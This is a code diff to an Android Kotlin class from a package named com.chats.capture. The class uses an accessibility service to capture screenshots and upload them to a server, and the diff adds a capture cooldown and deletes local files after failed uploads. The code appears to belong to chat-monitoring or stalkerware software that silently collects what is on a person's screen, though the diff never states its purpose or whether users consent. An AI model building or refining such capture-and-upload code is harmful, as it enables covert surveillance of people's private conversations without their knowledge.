@@ -3,12 +3,7 @@ package com.chats.capture.managers
 import android.accessibilityservice.AccessibilityService
 import android.content.Context
 import com.chats.capture.network.ApiClient
-import com.chats.capture.network.UploadManager
 import com.chats.capture.utils.ScreenshotCapture
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.launch
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
@@ -23,14 +18,18 @@ class ScreenshotManager(
     private val accessibilityService: AccessibilityService?
 ) {
     
-    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private val screenshotCapture: ScreenshotCapture? = accessibilityService?.let { 
         ScreenshotCapture(it) 
     }
     
+    // Track last screenshot capture time to prevent rapid duplicates
+    private var lastScreenshotTime: Long = 0
+    private val screenshotCooldownMs = 2000L // 2 seconds cooldown between screenshots
+    
     /**
      * Capture and upload screenshot
      * Returns true if screenshot was captured and uploaded successfully, false otherwise
+     * Prevents duplicate captures within cooldown period
      */
     suspend fun captureAndUploadScreenshot(): Boolean {
         if (screenshotCapture == null) {
@@ -38,8 +37,17 @@ class ScreenshotManager(
             return false
         }
         
+        // Check cooldown to prevent rapid duplicate captures
+        val currentTime = System.currentTimeMillis()
+        val timeSinceLastCapture = currentTime - lastScreenshotTime
+        if (timeSinceLastCapture < screenshotCooldownMs) {
+            Timber.w("Screenshot capture skipped - cooldown active (${screenshotCooldownMs - timeSinceLastCapture}ms remaining)")
+            return false
+        }
+        
         return try {
             Timber.d("Capturing screenshot...")
+            lastScreenshotTime = currentTime
             
             // Capture screenshot
             val screenshotPath = screenshotCapture.captureScreenshot()
@@ -51,7 +59,22 @@ class ScreenshotManager(
             Timber.d("Screenshot captured: $screenshotPath")
             
             // Upload screenshot and return result
-            uploadScreenshot(screenshotPath)
+            val uploadSuccess = uploadScreenshot(screenshotPath)
+            
+            // Clean up file even if upload failed to prevent accumulation
+            if (!uploadSuccess) {
+                try {
+                    val file = File(screenshotPath)
+                    if (file.exists()) {
+                        file.delete()
+                        Timber.d("Cleaned up screenshot file after failed upload: $screenshotPath")
+                    }
+                } catch (e: Exception) {
+                    Timber.w(e, "Failed to clean up screenshot file")
+                }
+            }
+            
+            uploadSuccess
         } catch (e: Exception) {
             Timber.e(e, "Error capturing and uploading screenshot")
             false
